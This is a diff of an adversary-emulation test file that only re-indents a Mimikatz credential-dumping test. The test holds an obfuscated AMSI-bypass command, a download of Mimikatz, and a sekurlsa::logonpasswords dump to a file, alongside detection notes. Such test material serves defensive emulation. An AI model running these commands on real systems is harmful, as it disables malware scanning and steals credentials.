@@ -158,35 +158,35 @@ atomic_tests:
 - name: Dumping Credentials using Mimikatz
   description: "Demonstrates the capability of Mimikatz to extract credentials from memory, including an AMSI bypass technique."
   auto_generated_guid: c70d532b-e6b9-4ef6-9d6e-a8727ec739df
-    supported_platforms:
-    - windows
-    input_arguments:
-      MimikatzExecutable:
-        description: "Path to the Mimikatz executable."
-        type: Path
-        default: C:\temp\mimikatz.exe
-      OutputFile:
-        description: "Path to save the dumped credentials."
-        type: Path
-        default: C:\temp\credentials.txt
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        powershell -Command "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( '{1}{0}'-F'F','rE' ) ) ; ( GeT-VariaBle ( '1Q2U' +'zX' ) -VaL ).'A`ss`Embly'.'GET`TY`Pe'(( '{6}{3}{1}{4}{2}{0}{5}' -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).'g`etf`iElD'( ( '{0}{2}{1}' -f'amsi','d','InitFaile' ),( '{2}{4}{0}{1}{3}' -f 'Stat','i','NonPubli','c,' )).'sE`T`VaLUE'( ${n`ULl},${t`RuE} )"
-        powershell "Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile 'C:\temp\mimikatz.zip'"
-        powershell "Expand-Archive -Path 'C:\temp\mimikatz.zip' -DestinationPath 'C:\temp'"
-        .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > #{OutputFile}
-    prerequisites:
-      - Administrator privileges on the Windows system.
-      - Internet access to download Mimikatz.
-      - Configure antivirus software to allow Mimikatz execution for this test.
-      - Basic command-line proficiency.
-    cleanup:
-      - Securely delete the Mimikatz executable, zip file, and output files.
-      - Reset any altered antivirus settings.
-    detection:
-      - Monitor for known Mimikatz process signatures and command-line arguments.
-      - Detect abnormal access patterns to sensitive files and memory areas.
-      - Implement behavior-based anomaly detection systems.
+  supported_platforms:
+  - windows
+  input_arguments:
+    MimikatzExecutable:
+      description: "Path to the Mimikatz executable."
+      type: Path
+      default: C:\temp\mimikatz.exe
+    OutputFile:
+      description: "Path to save the dumped credentials."
+      type: Path
+      default: C:\temp\credentials.txt
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      powershell -Command "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( '{1}{0}'-F'F','rE' ) ) ; ( GeT-VariaBle ( '1Q2U' +'zX' ) -VaL ).'A`ss`Embly'.'GET`TY`Pe'(( '{6}{3}{1}{4}{2}{0}{5}' -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).'g`etf`iElD'( ( '{0}{2}{1}' -f'amsi','d','InitFaile' ),( '{2}{4}{0}{1}{3}' -f 'Stat','i','NonPubli','c,' )).'sE`T`VaLUE'( ${n`ULl},${t`RuE} )"
+      powershell "Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile 'C:\temp\mimikatz.zip'"
+      powershell "Expand-Archive -Path 'C:\temp\mimikatz.zip' -DestinationPath 'C:\temp'"
+      .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > #{OutputFile}
+  prerequisites:
+    - Administrator privileges on the Windows system.
+    - Internet access to download Mimikatz.
+    - Configure antivirus software to allow Mimikatz execution for this test.
+    - Basic command-line proficiency.
+  cleanup:
+    - Securely delete the Mimikatz executable, zip file, and output files.
+    - Reset any altered antivirus settings.
+  detection:
+    - Monitor for known Mimikatz process signatures and command-line arguments.
+    - Detect abnormal access patterns to sensitive files and memory areas.
+    - Implement behavior-based anomaly detection systems.
 
